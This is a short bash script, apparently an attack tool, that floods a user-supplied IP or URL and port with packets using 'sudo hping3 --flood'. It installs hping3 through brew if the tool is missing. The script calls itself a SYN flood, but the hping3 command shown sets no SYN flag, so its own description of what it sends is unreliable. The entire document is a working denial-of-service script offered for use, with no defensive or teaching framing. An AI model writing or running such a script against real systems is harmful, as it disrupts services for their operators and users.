#!/bin/bash

# Check if the URL/IP is provided
if [ -z "$1" ]; then
  echo "Please provide the URL or IP to attack"
  exit 1
fi

# Check if port is provided, default is 80
PORT=${2:-80}

# Use hping3 to perform a SYN flood attack
echo "Starting SYN flood attack on $1:$PORT"

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null
then
    echo "hping3 is not installed. Installing..."
    brew install hping
fi

# Run the attack
sudo hping3 --flood -p $PORT $1

